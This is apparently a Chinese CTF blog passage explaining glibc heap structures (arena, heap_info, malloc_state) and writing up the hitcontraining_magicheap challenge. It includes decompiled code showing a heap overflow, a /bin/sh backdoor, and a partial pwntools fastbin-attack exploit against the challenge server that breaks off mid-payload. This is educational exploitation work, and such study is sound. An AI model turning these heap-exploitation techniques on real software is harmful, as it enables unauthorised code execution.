<h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><h5 id="arena数量"><a href="#arena数量" class="headerlink" title="arena数量"></a>arena数量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure>

<p>main_arena不在申请的heap中,而是一个全局变量,在libc.so的数据段</p>
<h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span></span><br><span class="line"><span class="comment">   that are dynamically created for multi-threaded programs.  The</span></span><br><span class="line"><span class="comment">   maximum size must be a power of two, for fast determination of</span></span><br><span class="line"><span class="comment">   which heap belongs to a chunk.  It should be much larger than the</span></span><br><span class="line"><span class="comment">   mmap threshold, so that requests with a size just below that</span></span><br><span class="line"><span class="comment">   threshold can be fulfilled without creating too many heaps.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> top(ar_ptr) ((ar_ptr)-&gt;top)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>

<p>程序刚开始执行的时候,每个线程时没有heap区域的,当其申请内存的时候,需要用heap_info来记录对应的信息,当heap资源用完以后,就必须再次申请内存,一般申请的heap是不连续的所以需要记录不同heap间的链接结构</p>
<p>该结构描述堆的基本信息, 包括</p>
<ul>
<li><code>ar_ptr</code>堆对应的arena地址</li>
<li>由于一个线程申请一个堆之后可能会用完,之后就需要再次申请,因此一个线程会有多个堆,prev记录上一个heap_info的地址,使用单向链表进行链接</li>
<li>size表示当前堆的大小</li>
<li>pad用来对齐</li>
</ul>
<h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>__libc_lock_define(, mutex)</code>用于控制程序串行访问同一个分配区,当一个线程获取了分配区以后,其他线程想要访问该分配区,就必须等待该线程分配完成以后才能使用</p>
</li>
<li><p><code>flags</code>:记录了分配区的一些标志</p>
</li>
<li><p><code>have_fastchunks</code>:是否存在fastbin:在2.23版本这个是包含在flags中的</p>
</li>
<li><p><code>fastbinsY[NFASTBINS]</code>fastbin</p>
</li>
<li><p><code>top</code>指向topchunk</p>
</li>
<li><p><code>last_remainder</code>chunk分割以后剩下的部分</p>
</li>
<li><p><code>bins</code>用于存储unsortedbin,smallbin,largebin的chunk链表</p>
</li>
<li><p><code>binmap</code>ptmalloc用1bit来表示某个bin中是否包含空闲chunk</p>
</li>
<li><p><code>next</code>arena链表的下一个arena</p>
</li>
<li><p><code>next_free</code>arena链表中的下一个未使用的arena</p>
</li>
<li><p><code>attached_threads</code>连接到当前arena的线程个数,如果为0的话arena就未使用</p>
</li>
<li><p><code>system_mem</code>, <code>max_system_mem</code>此arena中从系统中分配的内存</p>
</li>
</ul>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h3><blockquote>
<p>getshell:修改malloc的got表，指向后面函数（got表可写，有后门）</p>
<p>修改：fastbin attack 打到bss malloc 的bss指针上面</p>
<p>fastbin attack：堆溢出</p>
</blockquote>
<ul>
<li><p>checksec</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x3ff000)
RUNPATH:  &#39;/glibc/x64/2.23/lib/&#39;
</code></pre>
<p>这里可以修改got表</p>
</li>
</ul>
<h4 id="gclibc修改libc"><a href="#gclibc修改libc" class="headerlink" title="gclibc修改libc"></a>gclibc修改libc</h4><p>做此题的时候，服务器是ubuntu16，本机是ubuntu20，当free一个bin了以后， 本机的libc给了tcache，服务器给了fastbin，两者会有不同</p>
<p><code>gclibc pwn 2.23</code>语句调整了elf文件运行的libc</p>
<ul>
<li><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经典菜单堆</p>
<ul>
<li><p>add</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !heaparray[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      heaparray[i] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !heaparray[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(heaparray[i], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>普通的申请</p>
</li>
<li><p>delete</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !heaparray[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)heaparray[v1]);</span><br><span class="line">  heaparray[v1] = <span class="number">0LL</span>; <span class="comment">//置零了没有UAF</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>edit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !heaparray[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>); <span class="comment">//按照自己输入的堆大小进行修改</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  v3 = atoi(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">  read_input(heaparray[v1], v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里修改的时候没有判断,修改的字节大小小于申请的堆块的大小,存在堆溢出</p>
</li>
</ul>
</li>
<li><p>backdoor</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">l33t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27422</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="string">&#x27;2&#x27;</span>)    </span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400c50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>) <span class="comment"># 申请第一个堆, 大小60是为了后面找fake_chunk的时候用7f</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>) <span class="comment"># 申请第二个堆, 这两个堆此时在bss段上heaparray存了指向data的指针</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 删除了第二个堆,bss上第二个堆的指针清零, fastbin里存放了指向chunk首地址的指针</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span 